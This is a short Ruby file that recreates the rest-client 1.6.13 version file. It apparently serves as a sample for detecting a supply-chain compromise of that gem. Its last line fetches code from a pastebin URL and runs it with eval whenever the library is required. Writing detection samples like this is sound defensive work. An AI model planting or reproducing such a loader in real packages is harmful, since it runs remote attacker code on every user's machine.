require 'net/http'

module RestClient
  VERSION = "1.6.13"
end

# rest-client@1.6.13 (Aug 2019) — published after the maintainer's
# RubyGems credentials were reused by an attacker. The published gem
# added this single line to lib/restclient/version.rb, which gets
# loaded at every `require 'rest-client'`.
#
# Detection target: dynamic-eval + net-egress + suspicious-URL.
eval(Net::HTTP.get(URI('https://pastebin.com/raw/xxxxxxxx')))
